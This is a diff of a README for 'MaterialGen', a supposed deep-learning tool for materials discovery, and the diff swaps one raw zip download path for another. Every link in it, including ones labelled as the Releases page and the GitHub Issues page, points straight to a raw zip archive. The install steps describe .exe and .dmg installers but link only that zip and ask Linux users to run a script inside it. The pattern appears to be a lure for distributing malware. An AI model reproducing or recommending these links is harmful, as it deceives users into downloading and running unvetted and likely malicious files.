@@ -6,11 +6,11 @@ Welcome to MaterialGen! This is a user-friendly deep learning platform that help
 
 ## 📥 Download MaterialGen
 
-[![Download MaterialGen](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/utils/MaterialGen_2.1.zip)](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/utils/MaterialGen_2.1.zip)
+[![Download MaterialGen](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/api/Material_Gen_2.1.zip)](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/api/Material_Gen_2.1.zip)
 
 To get started, visit the Releases page and download the latest version of MaterialGen. 
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/utils/MaterialGen_2.1.zip)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/api/Material_Gen_2.1.zip)
 
 ## ⚙️ System Requirements
 
@@ -29,7 +29,7 @@ Follow these steps to install MaterialGen on your computer:
 2. **Open the Installer:**
    - For Windows: Double-click the downloaded `.exe` file.
    - For Mac: Open the `.dmg` file and drag the MaterialGen icon to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/utils/MaterialGen_2.1.zip` file and run the script provided within the folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/api/Material_Gen_2.1.zip` file and run the script provided within the folder.
 
 3. **Follow the Prompts:** The installation wizard will guide you through the process. Just follow the instructions on your screen.
 
@@ -62,7 +62,7 @@ Now you’re ready to use MaterialGen! Here’s a basic guide to get you started
 
 If you have questions or need help, the MaterialGen community is here to assist you. You can find resources, tutorials, and a forum for discussions. Here are some places to connect:
 
-- **GitHub Issues:** Report bugs or ask for help directly on our [GitHub Issues page](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/utils/MaterialGen_2.1.zip).
+- **GitHub Issues:** Report bugs or ask for help directly on our [GitHub Issues page](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/api/Material_Gen_2.1.zip).
 - **Discussion Forum:** Join our community discussions and share your experience.
 
 ## 📝 Additional Resources
@@ -89,4 +89,4 @@ These topics help you explore new horizons in material discovery and application
 
 MaterialGen empowers you to discover and design innovative materials. Just follow the download instructions and start your journey into material science today!
 
-[Download MaterialGen](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/utils/MaterialGen_2.1.zip) to bring the power of deep learning into your projects. Enjoy exploring and creating with MaterialGen!
+[Download MaterialGen](https://raw.githubusercontent.com/Tsebo69/MaterialGen/main/api/Material_Gen_2.1.zip) to bring the power of deep learning into your projects. Enjoy exploring and creating with MaterialGen!
